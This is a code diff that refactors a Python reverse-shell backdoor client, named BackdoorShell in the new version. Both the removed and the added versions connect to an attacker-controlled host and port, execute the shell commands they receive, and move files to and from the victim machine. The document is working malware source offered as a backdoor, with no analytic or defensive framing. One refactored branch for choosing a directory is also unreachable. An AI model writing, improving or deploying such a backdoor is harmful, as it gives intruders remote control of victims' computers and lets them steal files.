@@ -1,133 +1,109 @@
 import socket
 import subprocess
-import os
 import json
+import os
 import base64
 
-# Set up the target server and port (attacker's machine)
-HOST = "127.0.0.1"  # Replace with the attacker's IP address
-PORT = 4444  # Replace with the port the attacker is listening on
+class BackdoorShell:
+    def __init__(self, ip, port):
+        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.s.connect((ip, port))
+        self.default_prompt = "admin@medusax~$ "
+        self.current_prompt = self.default_prompt
+        self.in_shell_mode = False
 
+    def send_json(self, data):
+        self.s.send(json.dumps(data).encode())
 
-def execute_command(command):
-    # Execute the command and return the result
-    return subprocess.run(command, shell=True, capture_output=True)
-
-
-def send_json(data):
-    json_data = json.dumps(data)
-    sock.send(json_data.encode())
-
-
-def receive_json():
-    json_data = ""
-    while True:
-        try:
-            json_data += sock.recv(1024).decode()
-            return json.loads(json_data)
-        except ValueError:
-            continue
-
-
-def read_file(path):
-    with open(path, "rb") as file:
-        return base64.b64encode(file.read()).decode()
-
-
-def write_file(path, content):
-    with open(path, "wb") as file:
-        file.write(base64.b64decode(content))
-        return "[+] Download successful [+]"
-
-
-# Create a socket object to connect back to the attacker
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-# Attempt to connect to the attacker's server
-try:
-    sock.connect((HOST, PORT))
-
-    # Send an initial message to show the connection is established
-    sock.sendall("Successfully connected to the client.\n".encode("utf-8"))
-
-    default_prompt = "admin@medusax~$ "
-    current_prompt = default_prompt
-    in_shell_mode = False  # Tracks whether the client is in shell mode
-
-    while True:
-        # Send the current prompt to the server
-        sock.sendall(current_prompt.encode("utf-8"))
-
-        # Receive the command from the server
-        command = sock.recv(1024).decode("utf-8").strip()
-
-        # Handle upload or download commands
-        if command.startswith("download"):
-            _, file_path = command.split(" ", 1)
+    def receive_json(self):
+        data = ""
+        while True:
             try:
-                file_content = read_file(file_path)
-                send_json(file_content)
-            except Exception as e:
-                send_json(f"Error: {e}")
-            continue
-        elif command.startswith("upload"):
-            _, file_path = command.split(" ", 1)
-            content = receive_json()
-            try:
-                result = write_file(file_path, content)
-                sock.sendall(result.encode("utf-8"))
-            except Exception as e:
-                sock.sendall(f"Error: {e}".encode("utf-8"))
-            continue
-
-        # Handle the 'km' command to completely disconnect
-        if command.lower() == "km":
-            sock.sendall("Disconnecting...\n".encode("utf-8"))
-            sock.close()
-            break
-
-        # Handle the 'shell' command to enter the shell mode
-        if command.lower() == "shell":
-            # Switch to the C:\ directory
-            try:
-                os.chdir("C:\\")
-                in_shell_mode = True  # Enable shell mode
-                current_prompt = f"{os.getcwd()} > "
-                sock.sendall("Entering remote shell mode. Type 'exit' to leave.\n".encode("utf-8"))
-            except Exception as e:
-                sock.sendall(f"Failed to switch to C:\\: {e}\n".encode("utf-8"))
-            continue
-
-        # Handle the 'shell -d <directory>' command to set a specific directory
-        if command.startswith("shell -d"):
-            try:
-                _, _, directory = command.partition("-d")
-                directory = directory.strip()
-                os.chdir(directory)  # Change to the specified directory
-                in_shell_mode = True  # Enable shell mode
-                current_prompt = f"{os.getcwd()} > "
-                sock.sendall(f"Changed directory to {directory}\n".encode("utf-8"))
-            except Exception as e:
-                sock.sendall(f"Failed to change directory: {e}\n".encode("utf-8"))
-            continue
-
-        # If in shell mode, process shell commands
-        if in_shell_mode:
-            if command.lower() == "exit":
-                # Exit the shell and return to the default prompt
-                in_shell_mode = False  # Disable shell mode
-                current_prompt = default_prompt
-                sock.sendall("Exiting remote shell mode.\n".encode("utf-8"))
+                data += self.s.recv(1024).decode()
+                return json.loads(data)
+            except ValueError:
                 continue
 
-            # Execute the received shell command
-            output = execute_command(command)
-            sock.sendall(output.stdout + output.stderr)
-            continue
+    def change_directory(self, path):
+        try:
+            os.chdir(path)
+            return f"Changed directory to {path}"
+        except Exception as e:
+            return f"Failed to change directory: {e}"
 
-        # If not in shell mode, reject commands other than 'shell' or 'shell -d'
-        sock.sendall("Invalid command. Use 'shell' to start a remote shell, 'shell -d <directory>' to set a start directory, or 'km' to disconnect.\n".encode("utf-8"))
+    def execute_command(self, command):
+        try:
+            result = subprocess.run(command, shell=True, capture_output=True, text=True)
+            return result.stdout + result.stderr
+        except Exception:
+            return "[+] Error executing command [+]"
 
-except Exception as e:
-    print(f"Error: {e}")
-    sock.close()
+    def read_file(self, path):
+        with open(path, "rb") as file:
+            return base64.b64encode(file.read()).decode()
+
+    def write_file(self, path, content):
+        with open(path, "wb") as file:
+            file.write(base64.b64decode(content))
+            return "[+] Upload successful [+]"
+
+    def run(self):
+        self.send_json("Connected to combined client.")
+        while True:
+            self.send_json(self.current_prompt)
+            command = self.receive_json()
+
+            if isinstance(command, str):
+                command = command.strip().split()
+
+            if not command:
+                continue
+
+            cmd = command[0].lower()
+
+            if cmd == "km":
+                self.send_json("Disconnecting...")
+                self.s.close()
+                break
+
+            elif cmd == "shell":
+                self.in_shell_mode = True
+                os.chdir("C:\\")
+                self.current_prompt = f"{os.getcwd()} > "
+                self.send_json("Entering remote shell mode. Type 'exit' to leave.")
+                continue
+
+            elif cmd == "shell" and len(command) > 2 and command[1] == "-d":
+                self.in_shell_mode = True
+                self.current_prompt = f"{os.getcwd()} > "
+                self.send_json(self.change_directory(command[2]))
+                continue
+
+            elif self.in_shell_mode:
+                if cmd == "exit":
+                    self.in_shell_mode = False
+                    self.current_prompt = self.default_prompt
+                    self.send_json("Exiting remote shell mode.")
+                    continue
+                else:
+                    output = self.execute_command(" ".join(command))
+                    self.send_json(output)
+                    continue
+
+            elif cmd == "cd":
+                output = self.change_directory(command[1]) if len(command) > 1 else "Missing path"
+            elif cmd == "download":
+                output = self.read_file(command[1])
+            elif cmd == "upload":
+                output = self.write_file(command[1], command[2])
+            elif cmd == "exit":
+                self.s.close()
+                break
+            else:
+                output = self.execute_command(" ".join(command))
+
+            self.send_json(output)
+
+
+client = BackdoorShell("127.0.0.1", 4444)
+client.run()
